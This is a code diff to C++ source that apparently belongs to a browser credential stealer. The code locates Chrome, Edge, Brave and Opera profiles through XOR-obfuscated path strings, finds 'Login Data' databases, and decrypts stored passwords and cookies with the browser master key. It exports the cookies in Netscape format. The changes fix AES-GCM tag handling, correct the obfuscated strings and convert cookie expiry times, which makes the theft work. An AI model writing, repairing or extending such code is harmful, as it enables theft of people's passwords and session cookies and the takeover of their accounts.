@@ -57,9 +57,10 @@ namespace credential {
                 if (memcmp(ciphertext.data(), "v10", 3) == 0 || memcmp(ciphertext.data(), "v11", 3) == 0) {
                     if (ciphertext.size() < 3 + 12 + 16) return "";
                     std::vector<BYTE> iv(ciphertext.begin() + 3, ciphertext.begin() + 15);
-                    std::vector<BYTE> payloadToDecrypt(ciphertext.begin() + 15, ciphertext.end());
+                    std::vector<BYTE> enc(ciphertext.begin() + 15, ciphertext.end() - 16);
+                    std::vector<BYTE> tag(ciphertext.end() - 16, ciphertext.end());
                     crypto::AesGcm aes(masterKey);
-                    std::vector<BYTE> decrypted = aes.decrypt(payloadToDecrypt, iv);
+                    std::vector<BYTE> decrypted = aes.decrypt(enc, iv, tag);
                     return std::string(decrypted.begin(), decrypted.end());
                 } else if (memcmp(ciphertext.data(), "v20", 3) == 0) {
                     return "[v20 ABE]";
@@ -88,17 +89,17 @@ namespace credential {
             if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
                 std::string localAppData(path);
                 // "Google\\Chrome\\User Data"
-                browsers.push_back({"Chrome", localAppData + "\\" + utils::ws2s(utils::xor_wstr(L"\x1d\x35\x35\x3d\x36\x3f\x00\x19\x32\x28\x35\x37\x3f\x00\x0f\x29\x3f\x28\x00\x1e\x3b\x2e\x3b", 23))});
+                browsers.push_back({"Chrome", localAppData + "\\" + utils::ws2s(utils::xor_wstr(L"\x1d\x35\x35\x3d\x36\x3f\x06\x19\x32\x28\x35\x37\x3f\x06\x0f\x29\x3f\x28\x7a\x1e\x3b\x2e\x3b", 23))});
                 // "Microsoft\\Edge\\User Data"
-                browsers.push_back({"Edge", localAppData + "\\" + utils::ws2s(utils::xor_wstr(L"\x17\x33\x39\x28\x35\x29\x35\x3c\x2e\x00\x1f\x3e\x3d\x3f\x00\x0f\x29\x3f\x28\x00\x1e\x3b\x2e\x3b", 24))});
+                browsers.push_back({"Edge", localAppData + "\\" + utils::ws2s(utils::xor_wstr(L"\x17\x33\x39\x28\x35\x29\x35\x3c\x2e\x06\x1f\x3e\x3d\x3f\x06\x0f\x29\x3f\x28\x7a\x1e\x3b\x2e\x3b", 24))});
                 // "BraveSoftware\\Brave-Browser\\User Data"
-                browsers.push_back({"Brave", localAppData + "\\" + utils::ws2s(utils::xor_wstr(L"\x18\x28\x3b\x2c\x3f\x09\x35\x3c\x2e\x2d\x3b\x28\x3f\x00\x18\x28\x3b\x2c\x3f\x75\x18\x28\x35\x2d\x29\x3f\x28\x00\x0f\x29\x3f\x28\x00\x1e\x3b\x2e\x3b", 39))});
+                browsers.push_back({"Brave", localAppData + "\\" + utils::ws2s(utils::xor_wstr(L"\x18\x28\x3b\x2c\x3f\x09\x35\x3c\x2e\x2d\x3b\x28\x3f\x06\x18\x28\x3b\x2c\x3f\x77\x18\x28\x35\x2d\x29\x3f\x28\x06\x0f\x29\x3f\x28\x7a\x1e\x3b\x2e\x3b", 37))});
             }
             char appDataPath[MAX_PATH];
             if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
                 std::string appData(appDataPath);
                 // "Opera Software\\Opera Stable"
-                browsers.push_back({"Opera", appData + "\\" + utils::ws2s(utils::xor_wstr(L"\x15\x2a\x3f\x28\x3b\x00\x09\x35\x3c\x2e\x2d\x3b\x28\x3f\x00\x15\x2a\x3f\x28\x3b\x00\x09\x2e\x3b\x38\x36\x3f", 27))});
+                browsers.push_back({"Opera", appData + "\\" + utils::ws2s(utils::xor_wstr(L"\x15\x2a\x3f\x28\x3b\x7a\x09\x35\x3c\x2e\x2d\x3b\x28\x3f\x06\x15\x2a\x3f\x28\x3b\x7a\x09\x2e\x3b\x38\x36\x3f", 27))});
             }
             return browsers;
         }
@@ -142,7 +143,7 @@ namespace credential {
                     if (it.depth() > 3) { it.disable_recursion_pending(); continue; }
                     const auto& entry = *it;
                     // "Login Data"
-                    if (entry.path().filename() == utils::ws2s(utils::xor_wstr(L"\x16\x35\x3d\x33\x34\x00\x1e\x3b\x2e\x3b", 10))) {
+                    if (entry.path().filename() == utils::ws2s(utils::xor_wstr(L"\x16\x35\x3d\x33\x34\x7a\x1e\x3b\x2e\x3b", 10))) {
                         std::string tempDb = CopyDatabase(entry.path().string());
                         if (tempDb.empty()) continue;
                         sqlite3* db;
@@ -218,7 +219,11 @@ namespace credential {
                                         std::vector<BYTE> encryptedVal((BYTE*)blob, (BYTE*)blob + blobLen);
                                         std::string value = DecryptPassword(encryptedVal, key);
                                         if (!value.empty()) {
-                                            ss << (host?host:"") << "\tTRUE\t" << (path?path:"") << "\t" << (isSecure?"TRUE":"FALSE") << "\t" << expiry << "\t" << (name?name:"") << "\t" << value << "\n";
+                                            sqlite3_int64 unix_expiry = 0;
+                                            if (expiry > 0) {
+                                                unix_expiry = (expiry / 1000000) - 11644473600LL;
+                                            }
+                                            ss << (host?host:"") << "\t" << ((host && host[0] == '.') ? "TRUE" : "FALSE") << "\t" << (path?path:"") << "\t" << (isSecure?"TRUE":"FALSE") << "\t" << unix_expiry << "\t" << (name?name:"") << "\t" << value << "\n";
                                             totalCookies++;
                                         }
                                     }
